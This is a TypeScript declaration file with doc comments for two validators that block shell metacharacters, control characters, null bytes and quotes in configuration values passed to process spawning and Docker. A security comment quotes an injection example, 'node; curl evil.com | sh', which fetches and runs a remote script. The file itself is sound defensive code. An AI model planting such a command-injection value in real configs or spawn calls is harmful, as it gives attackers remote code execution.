/**
 * Input validation for executable paths and filesystem paths used in configuration.
 *
 * **Security context:** These values end up in `child_process.spawn()`, `execFile()`,
 * and Docker CLI args. Without validation, a malicious config value like
 * `"node; curl evil.com | sh"` would achieve remote code execution.
 *
 * **Design:** Blocklist approach targeting shell metacharacters, control characters,
 * null bytes, and quotes. Two functions with different strictness levels:
 * - `isSafeExecutableValue()` — strict, for command/binary fields (rejects leading dashes)
 * - `isSafePathValue()` — permissive, for filesystem path fields (allows separators, dashes)
 *
 * **Performance:** All validations complete in < 0.1µs per call (benchmarked).
 */
/**
 * Validates an executable name or path for safe use in process spawning.
 *
 * **Stricter than `isSafePathValue`:** also rejects leading dashes (which could
 * be interpreted as CLI flags by the spawned process) and requires bare names
 * to match `BARE_NAME_PATTERN`.
 *
 * Used by: `ExecutableTokenSchema` in Zod config validation for fields like
 * `cliBackends.command`, `memory.qmd.command`, `browser.executablePath`.
 */
export declare function isSafeExecutableValue(value: string | null | undefined): boolean;
/**
 * Validates a filesystem path value for use in configuration.
 * Blocks shell metacharacters, null bytes, control characters, and quotes
 * that have no legitimate use in filesystem paths. More permissive than
 * isSafeExecutableValue — allows leading dashes and doesn't require
 * bare-name patterns since paths always contain separators.
 */
export declare function isSafePathValue(value: string | null | undefined): boolean;
//# sourceMappingURL=exec-safety.d.ts.map